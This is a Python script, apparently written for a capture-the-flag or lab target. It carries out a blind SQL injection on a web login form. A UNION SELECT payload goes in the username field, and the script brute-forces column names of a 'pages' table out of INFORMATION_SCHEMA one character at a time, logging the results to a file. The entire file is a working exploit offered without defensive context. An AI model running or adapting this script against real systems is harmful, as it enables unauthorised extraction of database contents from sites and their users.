#!/usr/bin/env python3

from requests import *
import datetime


server = ""

invalid_username = "Invalid username"
invalid_password = "Invalid password"


def w(c):
	f.write(c)
	f.flush()

f = open("sql_output.txt", "a")
w("\n\n----------%s----------\n" % datetime.datetime.now())

total = ""

for column in range(0, 100):
	a = 1
	while a < 10000:
		SQL = "' UNION SELECT SUBSTR(COLUMN_NAME, %d,1) as name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'pages' LIMIT 1 OFFSET %d -- " % (a, column)
		#print(SQL)

		
		#test end of column name
		r = post(server + "/login", data = {'username' : SQL, 'password' : ''})
		#print(r.text)

		if invalid_username not in r.text and invalid_password not in r.text:
			print("end of column")
			total += '\n'
			w('\n')
			break


		for char in '_-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ |+-%':
			print("-----------------Character: %s-------------------------" % char)
			print("total: >>>\n%s\n<<<" % total)

			r = post(server + "/login", data = {'username' : SQL, 'password' : char})
			#print(r.text)

			if invalid_username in r.text:
				print("INVALID USERNAME FOUND, WTF is wrong??")
				print(r.text)

			elif invalid_password in r.text:
				print("Invalid password")

			else:
				print("Character found!!! >%s<" % char)
				total += char
				w(char)
				break

		
		a += 1

f.close()